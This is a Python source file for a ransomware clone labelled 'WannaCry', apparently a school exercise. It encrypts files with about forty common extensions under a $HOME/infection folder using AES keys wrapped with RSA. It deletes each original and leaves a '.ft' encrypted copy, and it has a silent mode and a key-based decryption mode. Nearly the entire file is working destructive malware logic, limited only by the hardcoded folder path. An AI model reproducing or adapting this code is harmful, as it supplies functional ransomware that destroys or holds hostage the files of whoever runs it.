import argparse
import os
import sys
import base64

import rsa
import aes
from pathlib import Path

def get_filenames(decryption):
	if decryption:
		extensions = { ".ft" }
	else:
		extensions = {
			".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost",
			".msg", ".eml", ".txt", ".csv", ".rtf", ".pdf", ".mdb", ".accdb",
			".sql", ".jpg", ".jpeg", ".png", ".raw", ".bmp", ".gif", ".tif",
			".avi", ".mpg", ".mpeg", ".mov", ".mp4", ".3gp", ".zip", ".rar",
			".tar", ".gz", ".bak", ".iso", ".vhd", ".vmdk", ".sqlite", ".7z"
		}

	filenames = []
	infection_area = os.getenv('HOME') + "/infection"
	for root, dirs, files in os.walk(infection_area):
		for filename in files:
			ext = os.path.splitext(filename)[1].lower()
			if ext in extensions:
				filenames.append(os.path.join(root, filename))
	return filenames

class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, *args, **kwargs):
        kwargs['max_help_position'] = 32
        super().__init__(*args, **kwargs)

def get_args():
	parser = argparse.ArgumentParser(prog="WannaCry", formatter_class=CustomHelpFormatter,
		description="This a 42-typed WannaCry. The decryption RSA-key is given with, we are too kind...")

	parser.add_argument("-v", "--version", action="version", version="%(prog)s v.1", help="Show the version of the program.")
	parser.add_argument("-s", "--silent", action="store_true", help="Run the program without polluting STDOUT.")
	parser.add_argument("-r", "--reverse", type=str, metavar="key", help="Decrypt '.ft' files using the given RSA key.")
	parser.add_argument("key", type=str, metavar="key", nargs="?", help="The RSA encryption key (can be passed as decryption key with -r).")

	args = parser.parse_args()

	if args.reverse and args.key:
		parser.error("Provide key either with -r or as a positional argument, not both.")
	if not args.reverse and not args.key:
		parser.error("You must provide a key either with -r or as a positional argument.")
	args.key = args.key or args.reverse
	if (len(args.key) < 16):
		parser.error("You must provide a key at least 16 characters long.")
	try:
		n, e = rsa.load_key_from_string(args.key)
	except Exception as e:
		parser.error("You must provide a key with a valid 64-base format.")

	if args.reverse: args.reverse = True
	return args

def get_content(filename):
	content = ""
	with open(filename, "rb") as file:
		return file.read()

def encryption(content, n, e):
    aes_key = aes.generate_aes_key(32)
    ciphertext = aes.aes_encrypt(aes_key, content)
    cipherkey = rsa.rsa_encrypt(aes_key, n, e)  # bytes, taille = taille clé RSA
    return cipherkey + ciphertext

def decryption(content, n, d):
    key_size_bytes = (n.bit_length() + 7) // 8
    cipherkey = content[:key_size_bytes]      # Taille clé RSA en bytes
    ciphertext = content[key_size_bytes:]
    
    aes_key = rsa.rsa_decrypt(cipherkey, n, d)  # pas d'encodage
    return aes.aes_decrypt(aes_key, ciphertext)


def infection(args, filenames, n, x):
	for filename in filenames:
		content = get_content(filename)
		if args.reverse:
			res = decryption(content, n, x)
			with open(filename, "wb") as f:
				f.write(res)
		else:
			res = encryption(content, n, x)
			os.remove(filename)
			with open(filename + ".ft", "wb") as f:
				f.write(res)

		if not args.silent:
			print(filename)
	return

def main():
	args = get_args()
	if args.silent:
		fd_null = open('/dev/null', 'w')
		sys.stdout = fd_null

	n, x = rsa.load_key_from_string(args.key)
	infection(args, get_filenames(args.reverse), n, x)

if __name__ == "__main__":
	main()

# with open("aes.py", "r") as f:
#	 content = f.read()
# key = aes.generate_aes_key()
# print(key)
# print(content)
# encrypt_content = aes.aes_encrypt(key, content)
# print(encrypt_content)
# print(aes.aes_decrypt(key, encrypt_content))

# n, d, e = rsa.rsa()
# rsa.save_rsa_key("key", n, d)
# rsa.save_rsa_key("key.pub", n, e)
# print(rsa.load_key_binary("key"))
# print(rsa.load_key_binary("key.pub"))
# print(rsa.aes_encrypt)